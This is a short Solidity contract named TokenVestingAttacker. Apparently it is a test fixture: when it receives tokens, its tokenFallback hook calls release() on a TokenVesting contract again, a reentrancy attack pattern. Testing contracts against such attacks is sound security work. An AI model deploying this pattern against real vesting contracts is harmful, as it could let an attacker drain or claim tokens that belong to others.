pragma solidity ^0.4.11;

import './../TokenVesting.sol';

contract TokenVestingAttacker {

    TokenVesting public tokenVesting;

    function TokenVestingAttacker(address vestingContract) public {
        tokenVesting = TokenVesting(vestingContract);
    }

    function () payable {
    }

    function tokenFallback(address _origin, uint _value, bytes _data) returns (bool){
        tokenVesting.release();
        return true;
    }
}
